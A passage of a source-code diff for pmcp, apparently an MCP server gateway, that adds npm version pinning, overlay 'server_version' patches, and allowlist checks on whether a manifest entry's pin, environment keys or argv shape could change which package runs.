+# npa `isFileType`, as `validation.NPM_FILE_TYPE_RE` defines it (reused, never
+# restated here): a selector -- or an UNSCOPED bare name -- matching it is a
+# tarball FILE to npm. npa checks it BEFORE the registry branch, so before
+# "is this a version" too: `1.0.0-x.tgz` is valid SemVer and still a file,
+# which is why the selector is tested before `is_valid_package_version`
+# (itself tarball-aware) is consulted (round 3, B1').
+_NPM_FILE_TYPE_RE = NPM_FILE_TYPE_RE
+# validate-npm-package-name's exclusionList, compared case-insensitively as it
+# does: npa refuses these as names (round 3, N-c).
+_NPM_EXCLUDED_NAMES = frozenset({"node_modules", "favicon.ico"})
+# A dist-tag: npa's registry branch accepts any encodeURIComponent-safe word
+# that is neither a version nor a range; this is the letter-led subset of it
+# (fullmatch, so no trailing newline).
+_TAG_WORD_RE = re.compile(r"[A-Za-z][A-Za-z0-9._-]*")
+# A letter-led word npm may read as a VERSION or RANGE, not a tag: semver's
+# loose grammar allows ANY run of leading `v`/`=` (`[v=\s]*`), then a partial
+# version whose parts are numbers or x/X/* wildcards, then a loose prerelease
+# with or without a hyphen (`x`, `X.x`, `v1`, `vv1.2.3`, `vvX`, `v1.X.xbeta`).
+# Refused like every range: rewriting it would be harmless to package identity
+# (still `fromRegistry`), but a range is not the version-or-tag class a pin
+# replaces. Deliberately broad -- any tail -- so a real tag it also matches
+# (`xyz`) only loses its pin, with a warning (round 3, N-a).
+_PARTIAL_VERSION_WORD_RE = re.compile(
+    r"[vV=]*(?:[0-9]+|[xX*])(?:\.(?:[0-9]+|[xX*])){0,2}.*"
+)
+
+
+def split_plain_registry_spec(arg: str) -> tuple[str, str | None] | None:
+    """``(name, selector)`` if npm would fetch *arg* from the registry as
+    ``name`` at an exact version or a dist-tag; else ``None``.
+
+    Accepted: ``name`` (npa: registry range ``*``), ``name@<exact SemVer>``
+    (npa: ``version``) and ``name@<dist-tag>`` (npa: ``tag``). Refused, by
+    class: anything ``parse_package_spec`` rejects (URLs, aliases, git, paths,
+    flags: their name half is not a package name, or they have no name); an
+    unscoped name ending in a tarball suffix (npa: ``file``); a selector that
+    is not an exact version or a tag word (``:`` / ``/`` / ``~`` / ``.``-led
+    forms, i.e. alias, git, URL, file, directory, and every range); a tag word
+    ending in a tarball suffix (npa: ``file``); and a tag word that npm reads as
+    a version or range (``x``, ``v1``, ``vvX``); a SemVer-shaped selector that
+    ends in a tarball suffix (npa: ``file``, checked first); and the names
+    npm excludes (``node_modules``, ``favicon.ico``). Pure grammar: it never asks the
+    resolver, so it works while npm package identity is disabled.
+    """
+    try:
+        name, selector = parse_package_spec(arg)
+    except (ValueError, TypeError, AttributeError):
+        return None
+    if not name.startswith("@") and _NPM_FILE_TYPE_RE.search(name):
+        return None
+    if name.lower() in _NPM_EXCLUDED_NAMES:
+        return None
+    if selector is None:
+        return name, None
+    # npa's order: `isFileType` on the selector BEFORE any registry reading, so
+    # a SemVer-shaped tarball (`3.25.5-corp.tgz`) is a file, not a version.
+    if _NPM_FILE_TYPE_RE.search(selector):
+        return None
+    if is_valid_package_version(selector):
+        return name, selector
+    if _TAG_WORD_RE.fullmatch(selector) and not _PARTIAL_VERSION_WORD_RE.fullmatch(
+        selector
+    ):
+        return name, selector
+    return None
+
+
+def _pin_npx_args(args: list[str], version: str) -> tuple[list[str], str] | None:
+    """*args* with the npx package slot pinned to *version*, and the name.
+
+    The slot is the provision gate's (`provision_gate._package_slot`): the
+    first argument that is not an allowlisted leading flag. It must be a plain
+    registry spec (`split_plain_registry_spec`); its NAME is kept and only its
+    version suffix is replaced, so a pin can select a version of the package
+    the entry already runs and never a different one. ``None`` otherwise:
+    ``myalias@npm:firecrawl-mcp@3.25.5`` -> ``myalias@3.25.5`` would be the
+    registry package ``myalias`` (codex P1), and
+    ``firecrawl-mcp@corp-mcp.TGZ`` -> ``firecrawl-mcp@3.25.5`` would turn a
+    local tarball into a public-registry fetch (round-2 B1).
+    """
+    # Local import: provision_gate is a consumer of this module's ServerConfig.
+    from pmcp.provision_gate import _NPX_LEADING_FLAGS
+
+    for index, arg in enumerate(args):
+        if arg in _NPX_LEADING_FLAGS:
+            continue
+        plain = split_plain_registry_spec(arg)
+        if plain is None:
+            return None
+        name, _selector = plain
+        return [*args[:index], f"{name}@{version}", *args[index + 1 :]], name
+    return None
+
+
+def _materialize_version_pin(server: ServerConfig) -> ServerConfig:
+    """Write ``server.version`` into every argv that spawns the server.
+
+    Both ``args`` (what ``client/manager.py`` spawns) and every ``install``
+    argv (what ``start_install`` runs): pinning one and not the other approves
+    X and runs latest (`provision_gate._config_runs_exactly`). All or nothing:
+    if any argv cannot be pinned to the same package, the pin is dropped with
+    a warning and the entry is returned unpinned with ``version=None``, so
+    gateway.health's unpinned-self-hosted warning still sees it.
+    """
+    version = server.version
+    if version is None:
+        return server
+    from pmcp.provision_gate import _is_npx
+
+    def refuse(reason: str) -> ServerConfig:
+        logger.warning(
+            f"Ignoring version pin {version!r} for server '{server.name}': "
+            f"{reason}; the server stays unpinned"
+        )
+        return replace(server, version=None)
+
+    if server.url:
+        return refuse("it is a remote server, so there is no local client to pin")
+    if not _is_npx(server.command):
+        return refuse(
+            f"'version'/'server_version' pins npx-launched servers only and this "
+            f"one runs {server.command!r}; pin a uvx/pip/cargo/docker server with "
+            "explicit command and args in .mcp.json or .pmcp.json instead"
+        )
+    pinned = _pin_npx_args(list(server.args), version)
+    if pinned is None:
+        return refuse(
+            "its args name no plain registry package (name or name@version/tag) "
+            "to pin -- an alias, URL, git, file or range spec could change which "
+            "package runs"
+        )
+    args, package = pinned
+    install: dict[Platform, list[str]] = {}
+    for platform, argv in server.install.items():
+        if not argv:
+            install[platform] = argv
+            continue
+        if not _is_npx(argv[0]):
+            return refuse(f"its {platform} install command is not npx")
+        pinned_install = _pin_npx_args(list(argv[1:]), version)
+        if pinned_install is None or pinned_install[1] != package:
+            return refuse(
+                f"its {platform} install command does not run the plain "
+                f"registry package {package!r} its args run"
+            )
+        install[platform] = [argv[0], *pinned_install[0]]
+    return replace(server, args=args, install=install)
+
+
+def _materialize_version_pin_soft(server: ServerConfig) -> ServerConfig:
+    """`_materialize_version_pin`, contained to one entry.
+
+    Overlay entries are only shape-checked where a field is parsed, so an argv
+    can still carry a non-string (``args: ["-y", 123]``) or a non-string
+    ``command``. HEAD loads such an entry untouched; a pin on it must cost that
+    entry its pin, never the whole manifest (Consiliency/pmcp#295 board,
+    codex P3).
+    """
+    try:
+        return _materialize_version_pin(server)
+    except Exception as exc:
+        logger.warning(
+            f"Ignoring version pin {server.version!r} for server '{server.name}': "
+            f"its command/args/install could not be read ({type(exc).__name__}: "
+            f"{exc}); the server stays unpinned"
+        )
+        return replace(server, version=None)
+
+
+def manifest_sources_fingerprint() -> tuple[object, ...]:
+    """A cheap identity for everything ``load_manifest()`` reads.
+
+    ``stat`` only -- no parse and no log line -- over the shipped manifest,
+    the user overlay, the project overlay the cwd walk finds, the raw
+    ``$PMCP_MANIFEST_PATH`` value and its target, and the trust store (a
+    project overlay's approval changes what loads without touching the
+    overlay file). A caller that only needs a few manifest facts on a hot
+    path (gateway.health) re-loads when this changes instead of on every
+    call (Consiliency/pmcp#295 board, claude F3).
+    """
+
+    def stat(path: Path) -> tuple[str, int | None, int | None]:
+        try:
+            st = path.stat()
+        except OSError:
+            return (str(path), None, None)
+        return (str(path), st.st_mtime_ns, st.st_size)
+
+    parts: list[object] = [
+        stat(Path(__file__).parent / "manifest.yaml"),
+        stat(Path.home() / ".pmcp" / "manifest.yaml"),
+    ]
+    project = _find_project_manifest()
+    parts.append(stat(project) if project is not None else None)
+    env_value = os.environ.get("PMCP_MANIFEST_PATH")
+    parts.append((env_value, stat(Path(env_value).expanduser())) if env_value else None)
+    try:
+        from pmcp.trust_store import trust_store_path
+
+        parts.append(stat(trust_store_path()))
+    except Exception:
+        parts.append(None)
+    return tuple(parts)
+
+
 def _parse_server_config(name: str, data: dict[str, Any]) -> ServerConfig:
     """Parse a server config from raw YAML data."""
     install_data = data.get("install", {})
@@ -613,6 +864,7 @@ def _parse_server_config(name: str, data: dict[str, Any]) -> ServerConfig:
         status=data.get("status"),
         source=data.get("source"),
         replacement=data.get("replacement"),
+        version=_parse_version_pin(name, data.get("version"), "version"),
     )
 
 
@@ -722,7 +974,10 @@ def _overlay_manifest_paths() -> list[tuple[str, Path]]:
 
 
 _OverlayDocument = tuple[
-    dict[str, ServerConfig], dict[str, CLIAlternative], dict[str, dict[str, str]]
+    dict[str, ServerConfig],
+    dict[str, CLIAlternative],
+    dict[str, dict[str, str]],
+    dict[str, str],
 ]
 
 
@@ -739,7 +994,7 @@ def _load_overlay_file(path: Path) -> _OverlayDocument:
         content = path.read_bytes()
     except OSError as exc:
         logger.warning(f"Skipping unreadable manifest overlay {path}: {exc}")
-        return {}, {}, {}
+        return {}, {}, {}, {}
 
     return _parse_overlay_document(path, content)
 
@@ -747,7 +1002,7 @@ def _load_overlay_file(path: Path) -> _OverlayDocument:
 def _parse_overlay_document(path: Path, content: bytes) -> _OverlayDocument:
     """Parse overlay bytes, fail-soft. ``path`` is for messages only.
 
-    Returns ``(servers, cli_alternatives, server_env)``. A YAML error or a
+    Returns ``(servers, cli_alternatives, server_env, server_version)``. A YAML error or a
     non-mapping top-level document logs a warning naming the file and returns
     empty dicts. Each entry is parsed in its own try/except so one malformed
     entry is skipped without dropping siblings.
@@ -759,18 +1014,22 @@ def _parse_overlay_document(path: Path, content: bytes) -> _OverlayDocument:
     operator can point a shipped server at a self-hosted endpoint without
     restating its command, args, and install block. It deliberately cannot
     create a server: ``servers:`` remains whole-entry replace.
+
+    ``server_version`` is the same kind of patch for ``version``: it pins an
+    existing server's client without restating its install matrix, and it
+    cannot create a server either (Consiliency/pmcp#294).
     """
     try:
         data = yaml.safe_load(content)
     except yaml.YAMLError as exc:
         logger.warning(f"Skipping unreadable manifest overlay {path}: {exc}")
-        return {}, {}, {}
+        return {}, {}, {}, {}
 
     if not isinstance(data, dict):
         logger.warning(
             f"Skipping manifest overlay {path}: top-level document is not a mapping"
         )
-        return {}, {}, {}
+        return {}, {}, {}, {}
 
     servers: dict[str, ServerConfig] = {}
     raw_servers = data.get("servers", {})
@@ -814,7 +1073,22 @@ def _parse_overlay_document(path: Path, content: bytes) -> _OverlayDocument:
     elif raw_server_env:
         logger.warning(f"Skipping 'server_env' in overlay {path}: not a mapping")
 
-    return servers, cli_alternatives, server_env
+    server_version: dict[str, str] = {}
+    raw_server_version = data.get("server_version", {})
+    if isinstance(raw_server_version, dict):
+        for name, raw_version in raw_server_version.items():
+            if not isinstance(name, str) or not name:
+                logger.warning(
+                    f"Skipping non-string 'server_version' key in overlay {path}"
+                )
+                continue
+            version = _parse_version_pin(name, raw_version, "server_version")
+            if version is not None:
+                server_version[name] = version
+    elif raw_server_version:
+        logger.warning(f"Skipping 'server_version' in overlay {path}: not a mapping")
+
+    return servers, cli_alternatives, server_env, server_version
 
 
 def load_manifest(manifest_path: Path | None = None) -> Manifest:
@@ -868,19 +1142,31 @@ def load_manifest(manifest_path: Path | None = None) -> Manifest:
                     continue
                 # Parse the bytes the gate judged. Re-opening `overlay_path`
                 # here would apply content nobody approved.
-                overlay_servers, overlay_clis, overlay_server_env = (
-                    _parse_overlay_document(overlay_path, content)
-                )
+                (
+                    overlay_servers,
+                    overlay_clis,
+                    overlay_server_env,
+                    overlay_server_version,
+                ) = _parse_overlay_document(overlay_path, content)
             else:
-                overlay_servers, overlay_clis, overlay_server_env = _load_overlay_file(
-                    overlay_path
-                )
-            if overlay_servers or overlay_clis or overlay_server_env:
+                (
+                    overlay_servers,
+                    overlay_clis,
+                    overlay_server_env,
+                    overlay_server_version,
+                ) = _load_overlay_file(overlay_path)
+            if (
+                overlay_servers
+                or overlay_clis
+                or overlay_server_env
+                or overlay_server_version
+            ):
                 logger.info(
                     f"Applying manifest overlay ({label}) from {overlay_path}: "
                     f"{len(overlay_servers)} servers, "
                     f"{len(overlay_clis)} CLI alternatives, "
-                    f"{len(overlay_server_env)} server_env patches"
+                    f"{len(overlay_server_env)} server_env patches, "
+                    f"{len(overlay_server_version)} server_version pins"
                 )
             for name in overlay_servers:
                 if name in servers:
@@ -906,6 +1192,25 @@ def load_manifest(manifest_path: Path | None = None) -> Manifest:
                     existing, extra_env={**existing.extra_env, **patch}
                 )
 
+            # Same rules as server_env: after this source's replaces, and never
+            # for a server the manifest does not already define.
+            for name, version in overlay_server_version.items():
+                existing = servers.get(name)
+                if existing is None:
+                    logger.warning(
+                        f"Manifest overlay ({label}) from {overlay_path} has a "
+                        f"'server_version' pin for unknown server '{name}': skipped"
+                    )
+                    continue
+                servers[name] = replace(existing, version=version)
+
+    # Materialise every pin once, after all overlays: a later source's
+    # whole-entry replace or server_version patch must be what gets written
+    # into argv, not an earlier one's.
+    servers = {
+        name: _materialize_version_pin_soft(entry) for name, entry in servers.items()
+    }
+
     manifest = Manifest(
         version=data.get("version", "1.0"),
         cli_alternatives=cli_alternatives,
diff --git a/src/pmcp/tools/handlers.py b/src/pmcp/tools/handlers.py
index 45a956c..71afb23 100644
--- a/src/pmcp/tools/handlers.py
+++ b/src/pmcp/tools/handlers.py
@@ -68,6 +68,7 @@ from pmcp.validation import (
     env_var_allowed,
     is_valid_package_name,
     is_valid_package_version,
+    normalized_executable_name,
 )
 from pmcp.identity import filter_self_references
 from pmcp.manifest.code_patterns_loader import get_code_hint
@@ -102,13 +103,16 @@ from pmcp.manifest.version_checker import (
     _docker_image_tag,
     _npm_package_arg,
     _npm_tag,
+    _parse_version,
     _uvx_package_arg,
+    compare_versions,
     detect_package_type,
     get_package_version,
 )
 from pmcp.policy.policy import PolicyManager
 from pmcp.provision_gate import (
     ProvisionDecision,
+    _package_slot,
     ProvisionSource,
     evaluate_provision,
     operator_safe,
@@ -196,8 +200,11 @@ from pmcp.manifest.loader import (
     Manifest,
     ServerConfig,
     credential_lookup_keys,
+    credential_requirement,
     credential_storage_key,
     is_usable_credential_value,
+    manifest_sources_fingerprint,
+    split_plain_registry_spec,
     requires_credential,
 )
 
@@ -446,6 +453,868 @@ def _detect_effective_version_pin(
     return None
 
 
+# A docker content digest: the one docker reference that cannot be re-pointed.
+# The algorithms and lengths the OCI image spec registers.
+_DOCKER_DIGEST_RE = re.compile(
+    r"sha256:[0-9a-f]{64}|sha384:[0-9a-f]{96}|sha512:[0-9a-f]{128}"
+)
+# Shaped like a digest (an algorithm, a colon, hex) but not a well-formed one:
+# upper-case hex, or the wrong length. It floats, and it is not a tag either.
+_DOCKER_DIGEST_LIKE_RE = re.compile(r"sha(?:256|384|512):[0-9A-Fa-f]+")
+
+
+def _is_exact_pin(package_type: str, pin: str) -> bool:
+    """Does *pin* hold the client at ONE artifact, or only name a selector?
+
+    ``_detect_effective_version_pin`` answers "does the argv carry any
+    version selector", which is the right question for update_server's
+    refusal (do not move what the operator chose) and the wrong one for
+    drift: ``^3.25.5``, ``~3.25.5`` and ``next`` re-resolve at every spawn
+    (Consiliency/pmcp#295 board, codex P2 / claude F1).
+
+    Decided PER LAUNCHER, with no rule shared across them: a generic SemVer
+    check that ran first made ``docker run img:3.25.5`` exact, and a docker
+    tag can be re-pointed at another image (#295 board round 4, C2).
+
+    * npm: one exact registry version (``is_valid_package_version``: never a
+      range, a dist-tag, or a string npm reads as a tarball). Build metadata
+      stays exact, because npm ignores it and runs the version it decorates.
+    * docker: a content digest only (``sha256:`` + 64 lowercase hex, or
+      sha384/sha512). Every tag, however version-like, is floating.
+    * pypi (uvx ``pkg==X``): one PEP 440 version with no wildcard. ``===X``
+      arrives here as ``=X``, which is not a version, so it floats. The whole
+      requirement is judged by ``_argv_pin_is_exact`` (a URL requirement is
+      never exact).
+    * cargo (``--version X``): cargo installs exactly X only when X has no
+      operator, and ``is_valid_package_version`` is that shape. ``=1.2.3`` is
+      a requirement to cargo, so it floats here: conservative, never silent.
+    * anything else: not exact.
+    """
+    if package_type == "npm":
+        return is_valid_package_version(pin)
+    if package_type == "docker":
+        return _DOCKER_DIGEST_RE.fullmatch(pin) is not None
+    if package_type == "pypi":
+        return "*" not in pin and _parse_version(pin) is not None
+    if package_type == "cargo":
+        return is_valid_package_version(pin)
+    return False
+
+
+def _uvx_requirement_is_exact(args: list[str]) -> bool:
+    """Is the uvx argv's requirement ONE PEP 440 version from an index?
+
+    Parsed as PEP 508 (``packaging``), not by splitting on ``==``: a URL
+    requirement (``pkg @ https://host/pkg-9.9.9.whl#x==1.0.0``) names a file,
+    whatever its fragment says, so it is never exact (#295 board round 5, N5).
+    Exact means exactly one ``==`` specifier with no wildcard. ``==1.0`` also
+    matches a local version ``1.0+x`` under PEP 440; a public index must not
+    host local versions, and a non-default index or find-links reaches uvx
+    only through the host's own configuration (trusted, a named non-goal) or
+    through the entry's env or argv, which ``_entry_redirect`` reports.
+    """
+    from packaging.requirements import InvalidRequirement, Requirement
+
+    raw, _from_flag = _uvx_package_arg(args)
+    if raw is None:
+        return False
+    try:
+        requirement = Requirement(raw)
+    except InvalidRequirement:
+        return False
+    if requirement.url:
+        return False
+    specs = list(requirement.specifier)
+    return len(specs) == 1 and specs[0].operator == "==" and "*" not in specs[0].version
+
+
+def _argv_pin_is_exact(
+    package_type: str, pin: str, command: str, args: list[str]
+) -> bool:
+    """``_is_exact_pin``, plus the whole requirement for a uvx argv."""
+    if not _is_exact_pin(package_type, pin):
+        return False
+    if package_type == "pypi" and normalized_executable_name(command) == "uvx":
+        return _uvx_requirement_is_exact(args)
+    return True
+
+
+def _floating_reason(package_type: str, pin: str = "") -> str:
+    """Why a non-exact selector does not hold the client still, per launcher.
+
+    npm's reading of a version string is not the same on every release (npa
+    12 reads ``1.0.0-x.tar-gz`` as a file, npa 13 as a version), so the npm
+    text claims only what holds on all of them (#295 board round 4, NB-2).
+    """
+    if package_type == "docker":
+        if _DOCKER_DIGEST_LIKE_RE.fullmatch(pin):
+            return (
+                "a malformed content digest: docker digests are lower-case hex "
+                "of the algorithm's length"
+            )
+        return (
+            "a docker tag, which can be moved to another image; only an "
+            "@sha256 digest pins one"
+        )
+    if package_type == "pypi":
+        return "not one exact PEP 440 version from an index"
+    if package_type == "cargo":
+        return "cargo reads it as a version requirement, not one exact version"
+    return "not one exact version on every npm release"
+
+
+# ---------------------------------------------------------------------------
+# What the ENTRY controls besides its pin (#295 board rounds 4-6).
+#
+# Trust boundary (maintainer decision, round 5): the host's own npm/uv/cargo/
+# docker configuration -- npmrc files at every level, uv.toml, cargo config,
+# the operator's shell environment, shims, caches, global bins, proxy and CA
+# settings -- is the operator's trusted environment, like PATH already is.
+# The warning fails loud only on what a manifest entry or overlay controls:
+# its argv, its launcher, a cwd it sets, and the env block it injects into the
+# child (``config.env``). The plan and the README state this as a non-goal.
+#
+# Both entry rules are ALLOWLISTS (round 6): a denylist of "keys that
+# redirect" or "flags that redirect" fails open on every spelling it does not
+# list (XDG_CONFIG_DIRS, LD_PRELOAD, a container command after the image...).
+# An injected key is silent only if it is proven inert, and an argv is silent
+# only if it has a recognised SHAPE in which the pinned package is what runs.
+# ---------------------------------------------------------------------------
+
+# Keys the entry may inject for any launcher: locale, terminal and colour
+# output. They change how output looks, never what is fetched or loaded.
+_ENTRY_ENV_INERT_KEYS = frozenset(
+    {"LANG", "LANGUAGE", "TERM", "TZ", "NO_COLOR", "FORCE_COLOR"}
+)
+_ENTRY_ENV_INERT_PREFIXES = ("LC_",)
+
+# npm config keys an entry may inject without changing which top-level package
+# or version runs: output and logging, network timing, the install prompt.
+# `cache` is NOT here: libnpmexec runs an existing `_npx/<hash>/node_modules/
+# <pkg>` on its package.json's word, without re-verifying the bytes, so a
+# cache an entry points elsewhere can change what runs (round 5, N1).
+_NPM_ENTRY_KEYS_THAT_CANNOT_REDIRECT = frozenset(
+    {
+        "loglevel",
+        "color",
+        "progress",
+        "timing",
+        "unicode",
+        "logs-dir",
+        "logs-max",
+        "fund",
+        "audit",
+        "update-notifier",
+        "yes",
+        "fetch-retries",
+        "fetch-retry-factor",
+        "fetch-retry-maxtimeout",
+        "fetch-retry-mintimeout",
+        "fetch-timeout",
+        "maxsockets",
+    }
+)
+# uv and cargo: output and network timing only, plus credentials (below).
+_UV_ENTRY_KEYS_THAT_CANNOT_REDIRECT = frozenset(
+    {"UV_NO_PROGRESS", "UV_HTTP_TIMEOUT", "UV_HTTP_RETRIES"}
+)
+_CARGO_ENTRY_KEYS_THAT_CANNOT_REDIRECT = frozenset(
+    {
+        "CARGO_TERM_COLOR",
+        "CARGO_TERM_QUIET",
+        "CARGO_TERM_VERBOSE",
+        "CARGO_TERM_PROGRESS_WHEN",
+        "CARGO_TERM_PROGRESS_WIDTH",
+        "CARGO_HTTP_TIMEOUT",
+        "CARGO_NET_RETRY",
+        "CARGO_BUILD_JOBS",
+        "CARGO_REGISTRY_TOKEN",
+    }
+)
+# Credentials say how to authenticate to a registry, never which one to use.
+_UV_CREDENTIAL_KEY_RE = re.compile(r"UV_INDEX_[A-Z0-9_]+_(?:USERNAME|PASSWORD)")
+_CARGO_CREDENTIAL_KEY_RE = re.compile(r"CARGO_REGISTRIES_[A-Z0-9_]+_TOKEN")
+
+
+@functools.lru_cache(maxsize=1)
+def _shipped_manifest_declarations() -> dict[str, frozenset[str]]:
+    """``{server name: its declared keys}`` from pmcp's OWN shipped manifest.
+
+    Read from the packaged ``manifest.yaml`` directly -- never through
+    ``load_manifest``, which applies overlays -- so no user, project or
+    ``$PMCP_MANIFEST_PATH`` overlay, and no ``.pmcp.json``/``.mcp.json``
+    entry, can add a name (#295 board round 7, B2). The file ships with
+    pmcp and does not change under a running gateway, so it is read once.
+    A server's declared keys are its ``env_var`` and its
+    ``api_key_optional_when`` relaxers. (``code_patterns.yaml`` declares no
+    env keys.)
+    """
+    import yaml
+
+    from pmcp.manifest import loader as manifest_loader
+
+    path = Path(manifest_loader.__file__).parent / "manifest.yaml"
+    try:
+        servers = (yaml.safe_load(path.read_bytes()) or {}).get("servers") or {}
+    except (OSError, yaml.YAMLError, AttributeError):
+        return {}
+    declared: dict[str, frozenset[str]] = {}
+    for name, entry in servers.items():
+        if not isinstance(name, str) or not isinstance(entry, dict):
+            continue
+        keys = set()
+        if isinstance(entry.get("env_var"), str):
+            keys.add(entry["env_var"])
+        relaxers = entry.get("api_key_optional_when") or []
+        if isinstance(relaxers, list):
+            keys.update(k for k in relaxers if isinstance(k, str))
+        declared[name] = frozenset(keys)
+    return declared
+
+
+def _declared_env_keys(server_name: str) -> frozenset[str]:
+    """The keys pmcp's SHIPPED manifest declares as *server_name*'s own.
+
+    The only declarations that exempt a key: the shipped manifest is pmcp's
+    own reviewed file, and it declares only application keys (84 names:
+    credentials such as ``FIRECRAWL_API_KEY`` and the relaxer
+    ``FIRECRAWL_API_URL``). A declaration in an overlay, ``.pmcp.json`` or
+    ``.mcp.json`` is entry-controlled, so it exempts nothing: an overlay
+    that names ``OPENSSL_CONF`` as its credential must not make it inert
+    (#295 board round 7, B2). There is no namespace list to get wrong.
+    """
+    return _shipped_manifest_declarations().get(server_name, frozenset())
+
+
+def _npm_env_config_key(env_key: str) -> str:
+    """The config key npm reads from an ``npm_config_*`` variable.
+
+    npm's own ``loadEnv`` rule (``@npmcli/config``, identical in npm 10 and
+    11): strip the prefix case-insensitively; unless the rest starts with
+    ``//``, replace every ``_`` except a leading one with ``-`` and lowercase.
+    """
+    key = env_key[len("npm_config_") :]
+    if key.startswith("//"):
+        return key
+    return (key[:1] + key[1:].replace("_", "-")).lower()
+
+
+def _npm_key_can_redirect(key: str, package: str) -> bool:
+    """Can an entry-injected npm config *key* change what runs for *package*?
+
+    Judged for the TOP-LEVEL package the pin names: a pin never holds its
+    dependency closure, which npm resolves fresh from ranges (round 5, N4).
+    """
+    if key.startswith("//"):
+        # A credential scoped to one registry (`//host/:_authToken`).
+        return False
+    scope, sep, rest = key.partition(":")
+    if sep and scope.startswith("@") and rest.lower() == "registry":
+        # `@scope:registry` redirects only that scope's packages.
+        return package.lower().startswith(f"{scope.lower()}/")
+    return key not in _NPM_ENTRY_KEYS_THAT_CANNOT_REDIRECT
+
+
+def _entry_env_key_is_inert(
+    family: str, key: str, value: str, package: str, declared: frozenset[str]
+) -> bool:
+    """Is *key* (set by the entry's env block) PROVEN not to change what runs?
+
+    An allowlist: the server's own declared keys, locale/terminal/colour
+    keys, and per launcher a few logging, timing and credential keys. Every
+    other key -- unknown, ``XDG_*``, ``LD_*``, ``CC``, a proxy, a CA file --
+    is not inert (round 6, X2/N4). Values are not special-cased: an empty
+    ``PATH`` makes exec search the cwd (round 6, N1), so an empty value of a
+    non-inert key is still not inert.
+    """
+    if key in declared:
+        return True
+    upper = key.upper()
+    if upper in _ENTRY_ENV_INERT_KEYS or upper.startswith(_ENTRY_ENV_INERT_PREFIXES):
+        return True
+    if family == "npm" and key.lower().startswith("npm_config_"):
+        return not _npm_key_can_redirect(_npm_env_config_key(key), package)
+    if family == "pypi":
+        return upper in _UV_ENTRY_KEYS_THAT_CANNOT_REDIRECT or bool(
+            _UV_CREDENTIAL_KEY_RE.fullmatch(upper)
+        )
+    if family == "cargo":
+        return upper in _CARGO_ENTRY_KEYS_THAT_CANNOT_REDIRECT or bool(
+            _CARGO_CREDENTIAL_KEY_RE.fullmatch(upper)
+        )
+    return False
+
+
+def _pep503_name(name: str) -> str:
+    return re.sub(r"[-_.]+", "-", name).lower()
+
+
+# Recognised argv SHAPES (round 6, X1). For each launcher: the flags that are
+# inert (boolean, or taking one value), and the rule for what follows. An
+# unrecognised flag, a missing piece, or anything that runs a different
+# command than the pinned package is not a recognised shape.
+_NPX_INERT_FLAGS = frozenset({"-y", "--yes", "--yes=true", "-q", "--quiet"})
+_UVX_INERT_BOOLEAN_FLAGS = frozenset(
+    {
+        "-q",
+        "--quiet",
+        "-v",
+        "--verbose",
+        "--no-progress",
+        "--isolated",
+        "--refresh",
+        "--no-cache",
+        "-n",
+    }
+)
+_UVX_INERT_VALUE_FLAGS = frozenset({"--color"})
+_CARGO_INERT_BOOLEAN_FLAGS = frozenset(
+    {"--locked", "-q", "--quiet", "-v", "--verbose", "-f", "--force"}
+)
+_CARGO_INERT_VALUE_FLAGS = frozenset({"--color", "-j", "--jobs"})
+_DOCKER_INERT_BOOLEAN_FLAGS = frozenset(
+    {"-i", "--interactive", "-t", "--tty", "--rm", "--init"}
+)
+_DOCKER_INERT_VALUE_FLAGS = frozenset(
+    {"--pull", "--name", "--network", "--net", "--platform"}
+)
+_DOCKER_ENV_FLAGS = frozenset({"-e", "--env"})
+
+
+def _split_flag(arg: str) -> tuple[str, str | None]:
+    name, sep, value = arg.partition("=")
+    return name, (value if sep else None)
+
+
+def _npx_shape_problem(args: list[str], package: str, pin: str) -> str | None:
+    """``npx [-y|--yes|--yes=true|-q|--quiet]* <package>@<pin> [arguments to it]``."""
+    for index, arg in enumerate(args):
+        if arg in _NPX_INERT_FLAGS:
+            continue
+        if arg.startswith("-"):
+            return f"its argv passes {_split_flag(arg)[0]}"
+        plain = split_plain_registry_spec(arg)
+        if plain is None or plain[0] != package or plain[1] != pin:
+            return f"its argv runs {arg!r}, not {package}@{pin}"
+        return None  # everything after is the package's own arguments
+    return "its argv names no package"
+
+
+def _uvx_shape_problem(args: list[str], package: str) -> str | None:
+    """``uvx [inert flags] [--from <req>] <command> [arguments to it]``.
+
+    With ``--from``, the command must be the requirement's own name (its
+    default entry point); any other command -- ``sh -c ...`` -- runs
+    something else from that environment (round 6, X1). ``--python`` is not
+    inert: it selects the interpreter, as ``UV_PYTHON`` does (round 6, N3).
+    """
+    from_req: str | None = None
+    skip = False
+    for index, arg in enumerate(args):
+        if skip:
+            skip = False
+            continue
+        if arg.startswith("-"):
+            name, value = _split_flag(arg)
+            if name == "--from":
+                if value is None:
+                    if index + 1 >= len(args):
+                        return "its argv passes --from with no requirement"
+                    from_req = args[index + 1]
+                    skip = True
+                else:
+                    from_req = value
+                continue
+            if name in _UVX_INERT_BOOLEAN_FLAGS and value is None:
+                continue
+            if name in _UVX_INERT_VALUE_FLAGS:
+                skip = value is None
+                continue
+            return f"its argv passes {name}"
+        if from_req is None:
+            return None  # `uvx <req> [args]`: the requirement names the command
+        from packaging.requirements import InvalidRequirement, Requirement
+
+        try:
+            requirement_name = Requirement(from_req).name
+        except InvalidRequirement:
+            return "its --from requirement is not a PEP 508 requirement"
+        if _pep503_name(arg) != _pep503_name(requirement_name):
+            return (
+                f"its argv runs {arg!r} from the --from environment, not the "
+                f"{requirement_name!r} package's own command"
+            )
+        return None
+    return "its argv names no command"
+
+
+def _cargo_shape_problem(args: list[str], package: str, pin: str) -> str | None:
+    """``cargo install [inert flags] <crate> --version <pin> [inert flags]``.
+
+    A ``+toolchain`` is not inert (as ``RUSTUP_TOOLCHAIN`` is not; round 6,
+    N3), and neither is any source flag (``--git``, ``--registry``...).
+    """
+    if not args or args[0] != "install":
+        return (
+            f"its argv selects toolchain {args[0]}"
+            if args and args[0].startswith("+")
+            else "its argv is not `cargo install ...`"
+        )
+    crates: list[str] = []
+    version: str | None = None
+    skip_as: str | None = None
+    for arg in args[1:]:
+        if skip_as is not None:
+            if skip_as == "version":
+                version = arg
+            skip_as = None
+            continue
+        if arg.startswith("-"):
+            name, value = _split_flag(arg)
+            if name in ("--version", "--vers"):
+                if value is None:
+                    skip_as = "version"
+                else:
+                    version = value
+                continue
+            if name in _CARGO_INERT_BOOLEAN_FLAGS and value is None:
+                continue
+            if name in _CARGO_INERT_VALUE_FLAGS:
+                skip_as = "value" if value is None else None
+                continue
+            return f"its argv passes {name}"
+        crates.append(arg)
+    if crates != [package] or version != pin:
+        return f"its argv does not install exactly {package} at {pin}"
+    return None
+
+
+def _docker_shape_problem(
+    args: list[str], package: str, pin: str, declared: frozenset[str]
